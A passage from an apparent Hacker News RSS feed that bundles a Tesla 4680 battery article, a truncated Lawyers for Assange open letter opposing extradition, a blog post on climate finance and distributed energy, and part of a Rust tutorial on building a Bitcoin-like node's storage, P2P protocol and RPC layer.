<p><a href="https://www.teslaoracle.com/2020/09/23/model-y-giga-casting-structural-battery-innovations-battery-day-part-1/#structural-battery">Tesla Structural Battery</a> with new formation of the 4680 cells will be as rigid as a brick you could ever imagine, says Sandy Munro. With single-piece front and rear castings and the structural battery in the middle, Tesla cars will be virtually twist-proof in an accident.</p>



<p>In Elon Musk‚Äôs words at the Battery Day event, this formation will reduce the impact of the <a href="https://en.wikipedia.org/wiki/Polar_moment_of_inertia#:~:text=Simply%20put%2C%20the%20polar%20moment,material%20composition%20or%20shear%20modulus." target="_blank" rel="noreferrer noopener nofollow">polar moment of inertia</a>, making Tesla vehicles even safer than they already are.</p>



<h2>Weight &amp; cost reductions</h2>



<p>Sandy Munro measured the length of the steel case cover of the 2170 battery cells and found out that with lesser number of 4680 cells, Tesla will alone be able to reduce around 30-40% use of steel in the battery pack (see Fig 7 below).</p>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<figure data-amp-lightbox="true"><amp-img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-1024x576.jpg" alt="Usage of steel reduces about 30-40% with the new 4680 battery cells (infographic)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170..jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-amp-lightbox="" lightbox="" layout="intrinsic" disable-inline-width="" i-amphtml-layout="intrinsic"><img src="https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-1024x576.jpg" alt="Usage of steel reduces about 30-40% with the new 4680 battery cells (infographic)." srcset="https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-1024x576.jpg 1024w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-300x169.jpg 300w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170.-768x432.jpg 768w, https://www.teslaoracle.com/wp-content/uploads/2020/09/Steel-Case-4680-vs-2170..jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="576" data-old-src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9JzU3Nicgd2lkdGg9JzEwMjQnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZycgdmVyc2lvbj0nMS4xJy8+"></amp-img><figcaption>Usage of steel reduces about 30-40% with the new 4680 battery cells (infographic).</figcaption></figure>



<p>Another cost and time savings with the usage of new 4680 cells will come from reducing the number of connections between the cells. With a significant number of fewer cells, the new battery pack will require around 1,800 connections compared to the current packs with ~8,800 wire tabs.</p>



<p>Sandy Munro then goes on to praise the brilliant idea of the single-piece front and rear underbody castings. A concept he has been promoting since 2017 but no automaker adopted it except for Tesla.</p>



<figure><div>
<amp-youtube data-videoid="GkQga-mzO4Y" layout="responsive" width="16" height="9" title="Sandy is Thrilled about Tesla's Battery Day &amp; Begins Battery Mock-up" i-amphtml-layout="responsive"><i-amphtml-sizer></i-amphtml-sizer><a placeholder="" href="https://www.youtube.com/watch?v=GkQga-mzO4Y"><amp-img src="https://i.ytimg.com/vi/GkQga-mzO4Y/hqdefault.jpg" layout="fill" object-fit="cover" alt="Sandy is Thrilled about Tesla's Battery Day &amp; Begins Battery Mock-up" i-amphtml-layout="fill"></amp-img></a></amp-youtube>
</div></figure>



<figure>
<amp-ad width="100vw" height="320" type="adsense" data-ad-client="ca-pub-0923072950810999" data-ad-slot="7514654329" data-auto-format="rspv" data-full-width="" i-amphtml-layout="fixed">
  
</amp-ad>
</figure>



<p>Stay tuned for more, follow us on&nbsp;<a href="https://news.google.com/publications/CAAqBwgKMOarmgswgLayAw" target="_blank" rel="noreferrer noopener">Google News</a>&nbsp;|&nbsp;<a href="https://flipboard.com/@TeslaOracle" target="_blank" rel="noreferrer noopener nofollow">Flipboard</a>&nbsp;|&nbsp;<a href="https://feedly.com/i/subscription/feed%2Fhttps%3A%2F%2Fwww.teslaoracle.com%2Ffeed%2F" target="_blank" rel="noreferrer noopener nofollow">RSS (Feedly)</a>.</p>



<h4>More Tesla Stories:</h4>



		</div></div>]]>
            </description>
            <link>https://www.teslaoracle.com/2020/09/25/tesla-4680-cell-analyzed-sandy-munro/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594572</guid>
            <pubDate>Fri, 25 Sep 2020 22:03:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lawyers for Assange Open Letter to the UK Prime Minister et al.]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24594374">thread link</a>) | @jstanley
<br/>
September 25, 2020 | https://www.lawyersforassange.org/en/open-letter.html | <a href="https://web.archive.org/web/*/https://www.lawyersforassange.org/en/open-letter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><strong>14 August 2020</strong></p>



<p><strong>Dear Prime Minister, </strong></p>

<p><strong>Dear Lord Chancellor and Secretary of State for Justice,</strong></p>

<p><strong>Dear Secretary of State for Foreign Affairs,</strong></p>

<p><strong>Dear Home Secretary,</strong></p>





<p>We write to you as legal practitioners and legal academics to express our collective concerns about the violations of Mr. Julian Assange‚Äôs fundamental human, civil and political rights and the precedent his persecution is setting.</p>



<p>We call on you to act in accordance with national and international law, human rights and the rule of law by bringing an end to the ongoing extradition proceedings and granting Mr. Assange his long overdue freedom ‚Äì freedom from torture, arbitrary detention and deprivation of liberty, and political persecution.</p>



<ol>
	<li><strong>ILLEGALITY OF POTENTIAL EXTRADITION TO THE UNITED STATES</strong></li>
</ol>



<p><strong>Extradition of Mr. Assange from the UK to the US would be illegal on the following grounds: </strong></p>



<ol>
	<li><strong>Risk of being subjected to an unfair trial in the US</strong></li>
</ol>



<p>Extradition would be unlawful owing to failure to ensure the protection of Mr. Assange‚Äôs fundamental trial rights in the US. Mr. Assange faces show trial at the infamous ‚ÄúEspionage court‚Äù of the Eastern District of Virginia, before which no national security defendant has ever succeeded. Here, he faces secret proceedings before a jury picked from a population in which most of the individuals eligible for jury selection work for, or are connected to, the CIA, NSA, DOD or DOS.<a href="#_edn1" name="_ednref1" title=""><sup><sup>[i]</sup></sup></a></p>



<p>Furthermore, Mr. Assange‚Äôs<strong> </strong>legal privilege, a right enshrined in Art. 8 European Convention on Human Rights (ECHR) and long recognised under English common law, was grossly violated through<strong> </strong>constant and criminal video and audio surveillance at the Ecuadorian embassy carried out by the Spanish security firm, UC Global. This surveillance was, according to witness testimony, ordered by the CIA and has triggered an investigation into the owner of UC Global, David Morales, by Spain‚Äôs High Court, the Audiencia Nacional.<a href="#_edn2" name="_ednref2" title="">[ii]</a> The surveillance resulted in all of Mr. Assange‚Äôs meetings and conversations being recorded, including those with his lawyers. The Council of Bar and Law Societies of Europe, which represents more than a million European lawyers, has expressed its concerns that these illegal recordings may be used ‚Äì openly or secretly ‚Äì in proceedings against Mr. Assange in the event of successful extradition to the US. The Council states that if the information merely became known to the prosecutors, this would present an irremediable breach of Mr. Assange‚Äôs fundamental rights to a fair trial under Art. 6 of the ECHR and due process under the US Constitution.<a href="#_edn3" name="_ednref3" title=""><sup><sup>[iii]</sup></sup></a> Furthermore, the prosecuting state obtained the totality of Mr. Assange‚Äôs legal papers after their unlawful seizure in the Embassy. Upon hearing that the Government of Ecuador was planning to seize and hand over personal belongings of Mr. Assange, including documents, telephones, electronic devices, memory drives, etc. to the US, the UN Special Rapporteur on Privacy, Joseph Cannataci, expressed his serious concern to the Ecuadorian government and twice formally requested it to return Mr. Assange's personal effects to his lawyers, to no avail.<a href="#_edn4" name="_ednref4" title=""><sup><sup>[iv]</sup></sup></a> <strong>The UN Model Treaty on Extradition prohibits extradition if the person has not received, or would not receive, the minimum guarantees in criminal proceedings, as enshrined in Art. 14 of the International Covenant on Civil and Political Rights (ICCPR).</strong><a href="#_edn5" name="_ednref5" title=""><sup><sup>[v]</sup></sup></a></p>



<ol start="2">
	<li><strong>The political nature of the offence prohibits extradition</strong></li>
</ol>



<p>The US superseding indictment issued against Mr. Assange on the 24 June 2020 charges him with 18 counts all related solely to the 2010 publications of US government documents. The publications, comprising information about the wars in Iraq and Afghanistan, US diplomatic cables and Guantanamo Bay, revealed evidence of war crimes, corruption and governmental malfeasance.<a href="#_edn6" name="_ednref6" title=""><sup><sup>[vi]</sup></sup></a></p>



<p>Charges 1-17 are brought under the Espionage Act 1917, which, in name alone, reveals the political and antiquated nature of the charges.<a href="#_edn7" name="_ednref7" title=""><sup><sup>[vii]</sup></sup></a><strong> </strong>Furthermore, the essence of the 18 charges concerns Mr. Assange‚Äôs alleged intention to obtain or disclose US state ‚Äúsecrets‚Äù in a manner that was damaging to the strategic and national security interests of the US state, to the capability of its armed forces, the work of the security and intelligence services of the US, and to the interests of the US abroad. Thus, the conduct, motivation and purpose attributed to Mr. Assange confirm the political character of the 17 charges brought under the Espionage Act (‚Äòpure political‚Äô offences) and of the hacking charge (a ‚Äòrelative political‚Äô offence). In addition, several US government officials have at various times ascribed motives ‚Äúhostile‚Äù to the US to Mr. Assange, an Australian citizen.<a href="#_edn8" name="_ednref8" title=""><sup><sup>[viii]</sup></sup></a> <strong>The UK-US Extradition Treaty, which provides the very basis of the extradition request, specifically prohibits extradition for political offences in Art. 4(1). </strong>Yet the presiding judge and prosecution wish to simply disregard this article by referring to the Extradition Act 2003 (‚ÄúEA‚Äù) instead, which does not include the political offence exception. This blatantly ignores the fact that the EA is merely an enabling act that creates the minimum statutory safeguards, but it does not preclude stronger protections from extradition as expressly provided in subsequently ratified treaties such as the UK-US Extradition Treaty. <strong>Furthermore, there is broad international consensus that political offences should not be the basis of extradition.<a href="#_edn9" name="_ednref9" title=""><sup><strong><sup>[ix]</sup></strong></sup></a> This is reflected in Art. 3 of the 1957 European Convention on Extradition, Art. 3 ECHR, Art. 3(a) of the UN Model Treaty on Extradition, the Interpol Constitution and every bilateral treaty ratified by the US for over a century.</strong></p>



<ol start="3">
	<li><strong>Risk of torture or other cruel, inhuman or degrading treatment or punishment in the US</strong></li>
</ol>



<p>The United Nations Special Rapporteur on Torture and Other Cruel, Inhuman or Degrading Treatment or Punishment (‚Äúthe UN Rapporteur on Torture‚Äù), Professor Nils Melzer, has expressed with certainty that, if extradited to the US, Mr. Assange will be exposed to torture or other cruel, inhuman or degrading treatment or punishment. Similar concerns have also been raised by the UN Working Group on Arbitrary Detention, and Amnesty International has recently restated its concerns in relation to the unacceptable risk of mistreatment.<a href="#_edn10" name="_ednref10" title=""><sup><sup>[x]</sup></sup></a></p>



<p>The detention conditions, and the draconian punishment of 175 years, in a maximum security prison, which Mr. Assange faces under the US indictment, would constitute torture or other cruel, inhuman or degrading treatment or punishment, according to the current UN Rapporteur on Torture and according to the<strong> </strong>consistently expressed opinion of his predecessor, as well as of NGOs and legal authorities.<a href="#_edn11" name="_ednref11" title=""><sup><sup>[xi]</sup></sup></a></p>



<p>If extradited, Mr. Assange would, by the US government‚Äôs own admission, likely be placed under Special Administrative Measures. These measures prohibit prisoners from contact or communication with all but a few approved individuals, and any approved individuals would not be permitted to report information concerning the prisoner‚Äôs treatment to the public, thereby shielding potential torture from public scrutiny and government from accountability.<a href="#_edn12" name="_ednref12" title=""><sup><sup>[xii]</sup></sup></a></p>



<p><strong>Under the principle of non-refoulement, it is not permissible to extradite a person to a country in which there are substantial grounds for</strong> <strong>believing that they would be subjected to torture. This principle is enshrined in the 1951 UN Convention Relating to the Status of Refugees, specifically Art. 33(1) from which no derogations are permitted. Also relevant are Art. 3(1) UN Declaration on Territorial Asylum 1967, Art. 3 of the Convention against Torture and Other Cruel, Inhuman or Degrading Treatment or Punishment (CAT)</strong>,<strong> and Art. 2 of the Resolution on Asylum to Persons in Danger of Persecution, adopted by the Committee of Ministers of the Council of Europe in 1967. As an obligation arising from the prohibition of torture, the principle of non-refoulement in this area is absolute and also takes on the character of a peremptory norm of customary international law, i.e. jus cogens.<a href="#_edn13" name="_ednref13" title=""><sup><strong><sup>[xiii]</sup></strong></sup></a></strong></p>



<p><strong>Mr. Assange, who was accepted as a political asylee by the Ecuadorian government owing to what have proved to have been wholly legitimate fears of political persecution and torture in the US, should clearly have been accorded protection of this principle, firstly by Ecuador and secondly by the UK. Ecuador violated its human rights obligations by summarily rescinding Mr. Assange‚Äôs asylum in direct contradiction of the ‚ÄòLatin American tradition of asylum‚Äô<a href="#_edn14" name="_ednref14" title=""><sup><strong><sup>[xiv]</sup></strong></sup></a> and the Advisory Opinion </strong><strong>OC-25/18 of 30 May 2018 of the Inter-American Court of Human Rights affirming the principle of non-refoulement in cases of persons who have entered an embassy for protection.<a href="#_edn15" name="_ednref15" title=""><sup><strong><sup>[xv]</sup></strong></sup></a> The entry of the Ecuadorian Embassy by UK police and the arrest of Mr. Assange were thus based on an illegal revocation of his nationality and asylum, which can only be rectified by the UK upholding its own duty to protect the principle of non-refoulement by denying extradition to the US.</strong></p>



<p><strong>B) VIOLATIONS OF THE FREEDOM OF THE PRESS AND THE RIGHT TO KNOW</strong></p>



<p>Counts 1-17 of the indictment under the Espionage Act violate the right to freedom of expression, the right to freedom of the press and the right to know. These counts present standard and necessary investigative journalistic practices as criminal.<a href="#_edn16" name="_ednref16" title=""><sup><sup>[xvi]</sup></sup></a> Such practices include indicating availability to receive information, indicating what information is of interest, encouraging the provision of information, receipt of information for the purpose of publication, and publication of information in the public interest.</p>



<p>Under the charge of conspiracy to commit computer intrusion, the initial indictment criminalised also Mr. Assange‚Äôs alleged attempt at helping his source to maintain their anonymity while providing the documents in question, which falls squarely under the standard journalistic practice and duty of protecting the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.lawyersforassange.org/en/open-letter.html">https://www.lawyersforassange.org/en/open-letter.html</a></em></p>]]>
            </description>
            <link>https://www.lawyersforassange.org/en/open-letter.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594374</guid>
            <pubDate>Fri, 25 Sep 2020 21:37:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Use Capitalism as a Climate Solution]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24594183">thread link</a>) | @ericvanular
<br/>
September 25, 2020 | https://ericvanular.com/capitalism-as-a-climate-solution/ | <a href="https://web.archive.org/web/*/https://ericvanular.com/capitalism-as-a-climate-solution/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Paradoxically, the way to help create solutions to the climate crisis is... the same way we got into this mess - <strong>by following the money</strong>.</p>
<p>Most people realize that we all need to create impactful solutions to the urgent environmental situation. An obvious reason why this isn‚Äôt the case already is because environmental and economic incentives don‚Äôt point the same way.</p>
<p>In order to actually get wide-scale change happening quickly, we have to make use of the main driving factor in our society - capitalism. Broad appeals to people‚Äôs emotions unfortunately aren‚Äôt getting us where we need to be fast enough. Let‚Äôs instead use people‚Äôs self-interest to solve issues.</p>
<p>The majority of greenhouse gas emissions today are due to burning fossil fuels for energy usage <a href="https://www.eia.gov/energyexplained/energy-and-the-environment/where-greenhouse-gases-come-from.php">[1]</a>. Coincidentally, I think that the energy industry is the one which will change the most over the next 30 years. There are a few reasons why this is the case. Ultimately, it is about economics and the very nature of the technologies themselves.</p>
<p>Let‚Äôs look at what‚Äôs driving these changes:</p>
<h3 id="1-clean-energy-is-free-the-fuel-costs-are-at-least"><a href="#1-clean-energy-is-free-the-fuel-costs-are-at-least" aria-label="1 clean energy is free the fuel costs are at least permalink"></a>1. Clean energy is free (...the fuel costs are at least)</h3>
<p>The fuel costs for solar, wind, and geothermal energy generation are zero. The major costs associated with these types of energy generation technologies are upfront construction and maintenance as necessary. This naturally leads to downwards pressure on prices as abundant, clean, and cheap energy pours onto the grid - encouraged by public sentiment and political subsidies. This has and will continue to turn the utility model on its head in the future.</p>
<h3 id="2-new-business--system-models-are-emerging"><a href="#2-new-business--system-models-are-emerging" aria-label="2 new business  system models are emerging permalink"></a>2. New business &amp; system models are emerging</h3>
<p>For over 100 years, the energy delivery model has remained largely the same. The model is completely centralized. Large power plants generate large amounts of energy. This energy is transmitted over long distances at great expense to you and I and the bakery down the street. It is difficult to predict the exact usage in advance. Because of this, "peak power" plants are turned on quickly to match real-time demand. The peak plants usually operate at enormous costs and are some of the dirtiest gas generation methods.</p>
<p><strong>Enter Distributed Energy</strong>. Technologies generating and working with electricity at or near where it will be used. Rooftop solar, small-scale combined heat and power (CHP), residential smart thermostats, electric vehicles, and behind-the-meter batteries count themselves among this group.</p>
<p>Distributed generation can serve a single structure (i.e. a home or business) but can also be part of a microgrid. It might appear at a major industrial facility, a military base, or a large college campus. When connected to the electric utility‚Äôs lower voltage distribution lines, distributed generation can help support delivery of clean, reliable power to additional customers and reduce electricity losses along transmission and distribution lines.</p>
<p>Distributed Energy Resources (DERs) are major components in the power system modernization. They are supported strongly by public and environmental drivers.</p>
<blockquote>
<p>Learn more about climate solutions, <a href="https://collective.energy/">join the growing community at Collective.Energy!</a></p>
</blockquote>
<p>The two-way, transactive grid is a concept which is in its infancy but will only get bigger going forward.</p>
<p><strong>The new economic energy architecture is about everyone financing everyone to build smaller, distributed power plants everywhere.</strong></p>
<p>The companies who win will be those that enable people to participate in the generation, storage, distribution, consumption, and financing of energy. You should position yourself on the right side of this major paradigm shift.</p>
<p>Business model innovation is perhaps more important than technology innovation. The cost curves of wind and solar are decreasing at an encouraging pace, but in order to enable this transition it is imperative that consumers are not expected to bear the burden of financing their own transition towards clean energy. This will be one of the most important factors in converting to a new energy economy, leading directly to our next point‚Ä¶.</p>
<h3 id="3-clean-energy-finance-is-big-and-getting-bigger"><a href="#3-clean-energy-finance-is-big-and-getting-bigger" aria-label="3 clean energy finance is big and getting bigger permalink"></a>3. Clean energy finance is big and getting bigger</h3>
<p><a href="https://www.bloomberg.com/news/articles/2019-09-05/clean-energy-investment-is-set-to-hit-2-6-trillion-this-decade">The results are in</a>. People like social finance, they like impact investing, and they like clean energy.</p>
<p>Historically, capital for solar and wind projects has been limited. The returns banks demanded was high and not commensurate to the adjusted risk/reward for the technologies. Transaction costs were high.</p>
<p>Now let‚Äôs think about the financial profile of clean energy projects. These are big projects with stable returns. Most of the risk is in construction. Predictable, regular cash flows are typical.</p>
<p>Financial markets have started to evolve around wind, solar, and the like. We‚Äôre now at the point where investors are willing to treat long term power purchase agreements (contracts) with trustworthy counter parties as proxies for bonds. Securitization of clean energy assets is fully on.</p>
<p>In the US, Canada, EU, and other developed areas, commissioned cash flowing projects are now attracting capital at low cost. Pre-construction capital is still expensive, in line with the risks associated with permitting and navigating regulations. Construction capital to build the generation is becoming cheaper as experience and best practices can be applied.</p>
<p>What does the future look like? One very interesting progression could be around the idea of participatory finance. What does that mean? The idea of crowdfunding could be extended to raising funding for the construction of clean energy projects. Groups of individuals banding together to fund and build solar or wind projects as a collaborative investment vehicle. Unlocking the power of the collective could be a game changer for the financing side.</p>
<h3 id="4-controversial-the-utility-death-spiral-is-real"><a href="#4-controversial-the-utility-death-spiral-is-real" aria-label="4 controversial the utility death spiral is real permalink"></a>4. <strong><em>Controversial:</em></strong> The utility death spiral is real</h3>
<p>Now here‚Äôs where it starts to get interesting. As participants in the old infrastructure move towards a new distributed infrastructure, they may choose to abandon large-scale grids. Instead, they may rely on localized networks and microgrids.</p>
<p>Currently, energy distribution represents a large (between 22% and 47% of a customer‚Äôs total bill) portion of electricity bills. There is also a lot of energy which is lost during the transmission. Total effective energy efficiency is higher the closer the source is to point of use. Every participant on the conventional grid pays to maintain and upgrade the infrastructure underlying this long distance energy transmission.</p>
<p>Well, what happens when people start leaving the grid? It‚Äôs still the same cost spread across less participants. Naturally, the cost of grid energy needs to rise in response. This then gives more reason for people to switch off the grid. The grid abandonment and subsequent rising costs create a vicious cycle for utilities‚Ä¶. Dare we use the dreaded words, stranded assets?</p>
<p>Eventually the role of conventional utilities may be more as a warden and administrator for vast networks of connected microgrids. They will be compensated for their ability to ensure a fair and stable system.</p>
<h2 id="tldr"><a href="#tldr" aria-label="tldr permalink"></a>TL;DR</h2>
<p>The short form of all this is that we can use the same economic engine which drove us down the hole of a carbon-based society to pull ourselves back out of it.</p>
<p>Regardless of how you feel about capitalism, it is a strong machine for getting things done. Let‚Äôs line up the financial incentives with the well-being of the planet. It might be the only hope.</p></div><p>I write about tips for living a good life, technology, &amp; saving the planet. Keep up with new posts. Unsubscribe whenever. I promise I won't spam you.</p></div>]]>
            </description>
            <link>https://ericvanular.com/capitalism-as-a-climate-solution/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24594183</guid>
            <pubDate>Fri, 25 Sep 2020 21:14:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bitcoin from Scratch Pt.3 ‚Äì The Network]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24593854">thread link</a>) | @monokh
<br/>
September 25, 2020 | https://monokh.com/posts/bitcoin-from-scratch-part-3 | <a href="https://web.archive.org/web/*/https://monokh.com/posts/bitcoin-from-scratch-part-3">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div id="post">
                
                <p><span>25 August 2020</span></p><p>In <a href="https://monokh.com/posts/bitcoin-from-scratch-part-1">Part 1</a>, we discovered the data structures involved in bitcoin and the role they play in the system.</p>
<p>In <a href="https://monokh.com/posts/bitcoin-from-scratch-part-2">Part 2</a>, we combined these concepts into a ‚Äúnode‚Äù, which handled transactions and was able to include them in blocks.</p>
<p>This part will produce a running network and some tools to observe it:</p>
<p><a href="https://monokh.com/img/nibble-demo.gif" target="_blank"><img src="https://monokh.com/img/nibble-demo.gif"></a></p>
<p>So far, running 2 nodes of this software would produce 2 different branches from the genesis block. This is because <strong>the nodes do not know about each other</strong>. To solve this, we need to implement a network layer as a way for the nodes to communicate.</p>
<p>It turns out, to go beyond a local in memory node, there is a huge amount of architecture involved. The following pieces will be covered:</p>
<ul>
<li><strong>Storage</strong></li>
<li><strong>P2P Wire protocol</strong></li>
<li><strong>Bootstrap nodes</strong></li>
<li><strong>RPC</strong></li>
<li><strong>Threading</strong></li>
<li><strong>Config</strong></li>
</ul>
<p>Due to the huge amount of code changes, we will mostly stick to explaining the concepts in this part.</p>

<p>As always the code can be found on GitHub: <a href="https://github.com/monokh/nibble">https://github.com/monokh/nibble</a></p>
<h2 id="storage">Storage</h2>
<p>The first step on the path of making our node resilient is ensuring that any data produced is stored, such that restarting the node will not take us all the way back to the genesis block.</p>
<p>Due to the nature of the node‚Äôs operation, we need a database that is able to do quick storage and lookups. Additionally, it would be preferable if the database was embeddable and did not require setup to ease the process of starting a node. <a href="https://rocksdb.org/" rel="nofollow">RocksDB</a> fulfills these requirements, it is a key value database that is stored on disk.</p>
<p>Bitcoin uses a combination of LevelDB and binary files. <a href="https://en.bitcoin.it/wiki/Bitcoin_Core_0.11_(ch_2):_Data_Storage" rel="nofollow">Data Storage</a></p>
<p>Let‚Äôs go over the database collections and their purpose:</p>
<p><strong>Blocks</strong></p>
<p><code>blockHash</code> ‚Üí <code>{ block }</code></p>
<p>We need to store the blocks that the node knows about. Such that we can build on them when mining and to provide this information to other nodes/clients as requested.</p>
<p><strong>Blocks Metadata</strong></p>
<p>We need a way to figure out what the latest block hash and the current block height is. To achieve this using only the blocks database, we would need to retrieve all the blocks and sort them according to their contents. To ease this burden, the metadata database provides some useful indexes:</p>
<ul>
<li><code>blockHash</code> ‚Üí <code>blockNumber</code></li>
<li><code>blockNumber</code> ‚Üí <code>blockHash</code></li>
<li><code>latest_block_hash</code> ‚Üí <code>blockHash</code></li>
</ul>
<p><strong>Balances</strong></p>
<p><code>publicKey</code> ‚Üí <code>balance</code></p>
<p>Similar to the metadata stored for blocks, we need to index balances for fast retrieval. Without this, we‚Äôd need to iterate through every block and transaction to aggregate a public key's final balance.</p>
<p>In Bitcoin, the concept of balance is not core to the data structures. Bitcoin's transactions have inputs and outputs. Outputs (or rather unspent outputs) are the amounts of Bitcoin your public key can spend. These outputs are saved on the node and can be aggregated easily to calculate the balance.</p>
<p>The storage code is very straightforward. Here's an example of updating the database when a new block is being added.</p>
<pre><code>pub fn set_latest_block(db: &amp;DB, block_hash: &amp;String, height: u32) -&gt; Result&lt;(), String&gt; {
    db.put(b"latest_block_hash", block_hash.clone()).map_err(|e| e.to_string())?;
    db.put(block_hash.clone(), height.to_string()).map_err(|e| e.to_string())?;
    db.put(height.to_string(), block_hash.clone()).map_err(|e| e.to_string())?;
    return Ok(());
}
</code></pre>
<h2 id="p2p-wire-protocol">P2P Wire Protocol</h2>
<p>As briefly mentioned, to produce a network, nodes need to communicate with each other and reach some form of consensus.</p>
<p>To facilitate this communication, we first need to describe a language for these nodes to use.</p>
<pre><code>const MESSAGE_NEW_PEER: &amp;str = "NEW_PEER";
const MESSAGE_PING: &amp;str = "PING";

const MESSAGE_GET_BLOCK: &amp;str = "GET_BLOCK";
const MESSAGE_GET_BLOCKS: &amp;str = "GET_BLOCKS";

const MESSAGE_NEW_BLOCK: &amp;str = "NEW_BLOCK";
const MESSAGE_NEW_TRANSACTION: &amp;str = "NEW_TRANSACTION";
</code></pre>
<ul>
<li><code>NEW_PEER(address)</code> Sent to a node to notify the node of a peer joining the network. Node responds with all peers it is aware of.</li>
<li><code>PING</code> Ping a node to check it‚Äôs availability.</li>
<li><code>GET_BLOCK(hash)</code> Retrieve a block by hash.</li>
<li><code>GET_BLOCKS</code> Retrieve all known block hashes.</li>
<li><code>NEW_BLOCK({block})</code> Sent to a node to notify it of a newly mined block.</li>
<li><code>NEW_TRANSACTION({block})</code> Sent to a node to notify it of a transaction that has just been added to the mempool.</li>
</ul>
<p>A TCP server runs alongside the node that is able to handle and respond to these messages.</p>
<pre><code>impl P2PServer {
    fn handle_get_blocks (&amp;mut self) -&gt; Result <string, string=""> {
        let block_hashes = storage::get_block_hashes(&amp;storage::db::blocks_md(true))?;
        return Ok(serde_json::to_string(&amp;block_hashes).unwrap());
    }
		...
}
</string,></code></pre>
<p>The node will also need to sync up with the network when it starts:</p>
<ol type="1">
<li>Send <code>NEW_PEER</code> for every node it knows about. If the node responds with a list of peers. Do <code>NEW_PEER</code> for each of those</li>
<li>Send <code>GET_BLOCKS</code> to each peer. Calculate the difference between the retrieved block hashes and local <code>latest_block_hash</code>. If there are differences, Retrieve the missing blocks with <code>GET_BLOCK</code> and process them <code>node.processBlock(block)</code>.</li>
</ol>
<p>By the end of this process, the node knows about every peer in the network and has synced it‚Äôs version of the blockchain with the other nodes, all the while validating that the blocks are valid according to the <a href="https://monokh.com/posts/bitcoin-from-scratch-part-2#consensus-rules">Consensus rules</a>.</p>
<h3 id="publish">Publish</h3>
<p>From this point on, the nodes are ready to publish new information to each other. For example, if the node successfully mines a block, it will broadcast it to all of it‚Äôs peers:</p>
<pre><code>pub fn publish (p2p_data_ref: Arc<mutex<p2pdata>&gt;, req: String, data: String) -&gt; Result&lt;(), Box<dyn error::error="">&gt;  {
    let p2p_data = p2p_data_ref.lock().unwrap();
    for peer in &amp;p2p_data.peers {
        if let Err(_e) = send(peer, req.clone(), Some(data.clone())) {
            println!("{}", format!("Failed to publish to peer: {}", peer).red());
        }
    }
    Ok(())
}

pub fn publish_block(p2p_data_ref: Arc<mutex<p2pdata>&gt;, block: block::Block) -&gt; Result&lt;(), Box<dyn error::error="">&gt; {
    publish(p2p_data_ref, MESSAGE_NEW_BLOCK.to_string(), serde_json::to_string(&amp;block)?)
}
</dyn></mutex<p2pdata></dyn></mutex<p2pdata></code></pre>
<h2 id="bootstrap-nodes">Bootstrap Nodes</h2>
<p>One question that may popup is, how does a node become aware of other nodes in the first place?</p>
<p>There is an inherent issue in P2P networking: <strong>it is not feasible to troll the vast internet in search of peers</strong>. We need a way to bootstrap into the network and find a set of other peers. This it the role of the ‚Äúbootstrap‚Äù node. In our case, these are just regular nodes that are highly available and it‚Äôs address is hardcoded into the node clients.</p>
<p>New nodes will announce their presence to the bootstrap node by sending the <code>NEW_PEER</code> message and will receive other peers to connect to.</p>
<h2 id="rpc">RPC</h2>
<p>The P2P protocol is very lightweight and bare on purpose so that it is able to handle the high volume of interactions.</p>
<p>We also want a convenient interface to interact with the node. For this, blockchains generally use JSON RPC(‚ÄúRemote Procedure Calls‚Äù) servers.</p>
<p>The RPC server provides methods for retrieving data as well as sending transactions using the node‚Äôs wallet.</p>
<p>A call looks like this:</p>
<pre><code>{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "getbalance",
    "params": [
        "03a23b2369525bf4094db602cd35fa3af24b440a2daf4a3c5e92a54196395d4b41"
    ]
}
</code></pre>
<p>This interface is used under the hood to implement the CLI as well as the web interface.</p>
<h2 id="threading">Threading</h2>
<p>Looking back on Part 2, we went from a local node that simply found PoW for a block and printed it to the console, to a network connected node that is running several processes at the same time. These processes are:</p>
<ul>
<li>Miner</li>
<li>P2P Server (TCP)</li>
<li>RCP Server</li>
<li>Web Server (Web UI)</li>
</ul>
<p>It‚Äôs important that all of these processes run in their own thread. Threading introduced a few challenges:</p>
<ul>
<li>The P2P service should be highly responsive.</li>
<li>The miner should be isolated as it‚Äôs a completely blocking process</li>
